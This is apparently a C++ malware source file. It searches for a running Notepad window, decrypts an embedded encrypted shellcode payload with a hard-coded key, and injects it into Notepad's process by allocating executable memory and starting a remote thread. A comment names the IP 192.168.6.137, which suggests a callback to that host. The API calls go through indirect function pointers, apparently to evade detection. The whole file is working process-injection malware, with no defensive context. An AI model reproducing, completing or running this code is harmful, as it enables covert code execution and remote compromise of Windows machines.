#pragma once
#include<stdio.h>
#include<iostream>
#include<Windows.h>
#include "Madryga.h"
#include "Custom_Function.h"

using namespace std;

char notepad[256];
bool flag = true;
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lparam) {
	char buffer[256];
    GetWindowTextA(hwnd, buffer, sizeof(buffer));
    if (strstr(buffer, "notepad") || strstr(buffer, "Notepad") || strstr(buffer,"notepad.exe")) {
		cout << "\nFound Not bad" << "\n";
		memcpy(notepad, buffer, strlen(buffer));
		flag = true;
		return false;
	}
	else {
		flag = false;
	}
    return true;
}

BOOL INJP(DWORD &pid) {

	//192.168.6.137
unsigned char encrypted_payload[] = "\xc5\xcb\x15\x0f\x54\x8c\x18\xd2\x3c\x19\xa7\xe1\x9b\x28\x9c"
									"\x9d\xda\x01\xbd\xce\xf9\x58\xd7\x56\x41\x68\x8a\x53\x10\x00"
									"\xcb\x52\x22\x5a\x9b\xf2\xd0\x4c\x0b\x97\x6a\x4b\x4c\x39\x81"
									"\x08\x31\xc2\xbe\x2c\xe1\xfc\x06\x28\x00\x61\xc0\xc8\x05\x09"
									"\x41\xc1\xe0\xff\x42\xc1\xd1\x4c\x8f\x72\x00\x8a\x43\x34\x00"
									"\x41\xd0\x89\x92\x98\x80\x80\x04\x4c\xa5\xe0\x75\x66\x40\x49"
									"\x90\x50\x89\x5a\x08\xc4\x0b\x44\x24\x69\x21\xd1\xe2\x5e\x00"
									"\xbf\xc9\x43\x99\x24\x08\xc8\x05\xd2\x6d\x11\xc8\x49\x39\x88"
									"\xec\x41\xc3\xdb\x1d\xc1\x81\xc5\x3c\xc0\x55\xf0\x4d\x0b\x04"
									"\x64\x08\x47\x2b\xc1\xf5\x58\x5c\x40\xab\x60\x25\x48\x09\x98"
									"\x26\x41\x89\x1e\x58\xc4\x0b\x44\x18\x69\x21\xd1\x40\x83\x4c"
									"\xc8\x48\x03\xc2\x51\xd8\xc1\x5c\x5a\x79\x7a\x40\x59\x49\x11"
									"\x01\x5a\x4a\x91\xfc\xa0\xc1\x56\xfb\xc0\x78\x40\x58\x52\x00"
									"\xcb\x12\xeb\x45\xef\x7f\x7f\x59\x4d\x9e\x57\x72\x33\x57\x7b"
									"\x72\x00\x02\x53\x46\xc9\x09\xe2\x4c\xa1\xcc\xa1\x00\x08\x48"
									"\x09\x89\xe7\x5b\xac\x82\x80\x1f\x3d\xe0\x88\x04\x88\x49\x1c"
									"\x09\x89\xe6\x5e\x99\x71\xc1\xbe\x48\x57\x06\x06\xfe\xdd\x04"
									"\xc9\xea\x6a\x13\x11\x80\x80\x5d\x45\x9a\x09\x81\x6a\x08\xb7"
									"\x95\x50\x52\x5f\x21\x49\xcd\x35\xc4\x68\xdf\xc1\x49\x81\x8a"
									"\x08\xff\xc2\x5a\x99\x41\xc1\xbe\xee\x2f\xff\xe1\xfe\xdd\x00"
									"\xc9\xc7\x68\x02\x51\xd8\xcc\x8d\xe6\x68\xa9\xf8\x40\xb2\xd1"
									"\xe5\x74\x63\xed\xc5\xc8\x01\xc0\x44\x22\x20\x01\x48\xb0\x2b"
									"\x2d\x64\x02\x12\x10\x80\x80\x45\x54\x61\x70\x49\x88\xea\x1f"
									"\x17\x57\x4f\x23\xd0\xea\x8d\x5d\x45\x70\xc2\xfd\x67\xcf\x0c"
									"\x64\x54\x03\x13\x58\x0d\xc4\x20\x1c\xe6\x20\x69\x49\x81\xae"
									"\x16\x50\x43\x42\x51\xd0\xc1\x54\x4d\xdf\xe0\x40\x51\x41\xb7"
									"\x88\x4d\x8b\xd3\x5c\x09\x41\x45\xbe\x59\xec\x3e\x87\xf7\x9d"
									"\x08\x31\xd0\x5a\xef\x4a\x0b\x0a\x45\x9a\x28\x86\x1c\x68\xb7"
									"\x95\xbb\xf2\xa7\xb2\xd6\xc1\xbe\xa2\xb5\x9d\x9c\xfe\xdd\x00"
									"\xc3\xc4\x2a\x2e\x16\xfc\x8a\x84\xff\xc0\x55\x04\xba\x4f\x5b"
									"\x32\x6f\x68\x12\x49\xc1\x09\xde\xfb\xf5";
	char first[] = "\xfc";

	unsigned char key[] = { 0x66, 0x65, 0xff, 0x69, 0x6d, 0x69, 0x6f, 0x71 };

	int len_key = sizeof(key);

	int my_payload_len = sizeof(encrypted_payload);
	
	int payload_len = sizeof(encrypted_payload);
	int pad_len = my_payload_len + (8 - my_payload_len % 8) % 8;
	unsigned char* padded = (unsigned char*)malloc(pad_len * sizeof(unsigned char));

	memcpy(padded, encrypted_payload, my_payload_len);
	memset(padded + my_payload_len, 0x90, pad_len - my_payload_len);
	unsigned char* decrypted = (unsigned char*)malloc(pad_len * sizeof(unsigned char));
	a5_1_decrypt(key, len_key, encrypted_payload, pad_len, decrypted);
	/*printf("\nDecrypted message: \n");
	for (int i = 0; i < pad_len; i++) {
		printf("0x%02x, ", decrypted[i]);
	}
	printf("\n\n");*/
    pEnumWindows(EnumWindowsProc, NULL);
	if (flag == false) {
		return false;
	}
    HANDLE ph; // process handle
    HANDLE rt; // remote thread handle
    
    //Find Windows for notepad
    HWND window = pFindWindowA(NULL, notepad);
    if (window == NULL) {
		return false;
    }
	pGetWindowProcessId(window, &pid);
    ph = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    LPVOID rb = pVirtualAllocEx(ph, NULL, my_payload_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(decrypted, first, 1);
    bool wpm = pWriteProcessMemory(ph, rb, decrypted, my_payload_len, NULL);
	if (wpm == 0) {
	
		cout << "Can not WPM: " << GetLastError() << endl;
	
	}
    rt = pCreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
	if (rt == NULL){
		cout << "Can not CRT: " << GetLastError() << endl;
	}
    pCloseHandle(ph);
	pCloseHandle(rt); 
	return true;
}